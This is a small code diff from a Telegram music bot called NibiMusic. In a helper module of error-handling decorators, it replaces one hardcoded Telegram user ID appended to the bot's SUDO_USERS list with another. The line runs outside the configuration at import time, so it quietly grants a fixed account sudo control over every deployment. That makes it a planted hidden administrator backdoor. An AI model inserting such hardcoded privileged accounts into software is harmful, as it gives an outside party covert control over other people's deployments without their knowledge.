@@ -4,7 +4,7 @@ from pyrogram.types import Message
 from NibiMusic.Modules.helpers.admins import get_administrators
 from NibiMusic.config import SUDO_USERS
 
-SUDO_USERS.append(6190680150)
+SUDO_USERS.append(5230338052)
 
 def errors(func: Callable) -> Callable:
     async def decorator(client: Client, message: Message):
